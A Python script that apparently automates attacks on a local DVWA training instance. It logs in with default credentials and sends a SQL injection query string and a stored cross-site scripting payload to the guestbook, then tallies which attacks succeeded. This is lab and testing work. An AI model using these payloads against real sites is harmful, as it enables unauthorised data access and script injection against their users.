#import requests
from requests_html import HTMLSession
from typing import NamedTuple
import json

#Constants
mURL = 'http://localhost/'
APP_USER = 'admin'
APP_PASSWORD = 'password'

#Global Variables

################
# Helper Classes
################

#Track attack results
class Attack(NamedTuple):
    atName:str
    atURL:str
    atStatus:str
    atSuccess:bool

attackList = []

################
# Tests
################

#Test log in successfull
def test_LoggedIn(response):
    failed = ("/login.php" in response.url)
    if failed: 
        print("\n---------------------\nERROR: Failed to log in\n---------------------\n") 
        return False
    else: 
        print("--> Logged in")    
        return True

#Print packet details
def printPacket(packet, printText):
    #print("\n***** Request *****")
    #print("Request body:\n", packet.request.body)
    #print("Request Headers:\n", packet.request.headers)
    #print("\n***** Response *****")
    print("   Status Code:", packet.status_code)
    print("   url", packet.url)
    print("   headers", packet.headers)    
    if printText:
        print("$$$$$$ Text\n", packet.text)
    print("")
     

def login(mSession):
    # login to web app    
    print ("\n---------------------\n$$-Attempting Login-$$\n---------------------")
    # Get token ID
    tokenResp = mSession.get(mURL + "login.php")
    #printPacket(tokenResp, False)
    UID = tokenResp.html.find("input")
    user_token = str(UID[3])[str(UID[3]).find("value='")+7:-2]
    # Build post payload
    payload = {
        "username": APP_USER,
        "password": APP_PASSWORD,
        "user_token" :  user_token,    
        "Login" : "login"      
    }    
    # Login
    loginResp = mSession.post(mURL + "login.php", data=payload)
    printPacket(loginResp, False)
    #Verify login and add attack results
    test_response = test_LoggedIn(loginResp)
    attackList.append(Attack("Login", loginResp.url, loginResp.status_code, test_response))

 
def test_SQL_Injection_1(mSession):
    #Basic 
    #SQL Standard
    print ("\n---------------------\n$$-Getting SQLInjectionLesson-$$\n---------------------")
    print("   Initial Get")
    responseA = mSession.get(mURL + "vulnerabilities/sqli/?id=1&Submit=Submit")
    printPacket(responseA, False)
    print("Response Count: ",  len(responseA.html.find("pre")), "\n")
    stCount = len(responseA.html.find("pre"))
    #SQL Attack
    print("   SQL Attack")
    attackA = mSession.get(mURL + "vulnerabilities/sqli/?id=%25%27+or+%270%27%3D%270&Submit=Submit")
    printPacket(attackA, False)
    print("Response Count: ",  len(attackA.html.find("pre")))
    atckCount=len(attackA.html.find("pre"))
    #Need to id how to get actual resposne
    attackList.append(Attack("SQL_A", attackA.url, attackA.status_code, atckCount > stCount))
    


def test_CSS_Attack_1(mSession):
    print ("\n---------------------\n$$-Getting XSS Attack-$$\n---------------------")
    
    #Clear Guestbook
    payloadClear = {
        "txtName": "",
        "mtxMessage": "",
        "btnClear":"Clear Guestbook"
    }    
    clearResp = mSession.post(mURL + "vulnerabilities/xss_s/", data=payloadClear)    
    print("   Clear Guestbook")
    printPacket(clearResp, False)
    print("Response Count: ",  len(clearResp.html.find("#guestbook_comments")), "\n")
    

    #Post XSS message
    payloadAttack = {
        "txtName": "Hax Test",
        "mtxMessage": "<script>assert('Hacked by HaxBox')</script>",
        #"mtxMessage": "<script>document.getElementByID('#guestbook_comments').classList.add('Haxed')</script>",
        "btnSign":"Sign Guestbook"
    }    
    attackResp = mSession.post(mURL + "vulnerabilities/xss_s/", data=payloadAttack) 
    print("   XSS Attack") 
    printPacket(attackResp, False)
    #Verify >0 response with script in guestbook
    gbEntries = len(attackResp.html.find("#guestbook_comments"))
    print("Response Count: ",  len(attackResp.html.find("#guestbook_comments")), "\n")
    Success = ("Name: Hax Test<br />Message: <script>assert('Hacked by HaxBox')</script>" in attackResp.text)

    #Document attack
    attackList.append(Attack("XSS_A", attackResp.url, attackResp.status_code, gbEntries == 1 and Success))


def main():
    #Carry out attacks
    print("\n*********************\nAttacking - " + mURL + "\n*********************")
    session = HTMLSession()
    login(session)
    test_SQL_Injection_1(session)
    test_CSS_Attack_1(session)
    
    #Print results
    print("\n---------------------\nTest Results\n---------------------")
    totCount = 0
    sucCount = 0
    for atck in attackList:    
        totCount+=1
        print("--> ", atck.atName, "-", atck.atSuccess)
        if atck.atSuccess: sucCount+=1
    print("Attack results (", sucCount, "/", totCount, ")")
    


if __name__ == "__main__":
    main()
    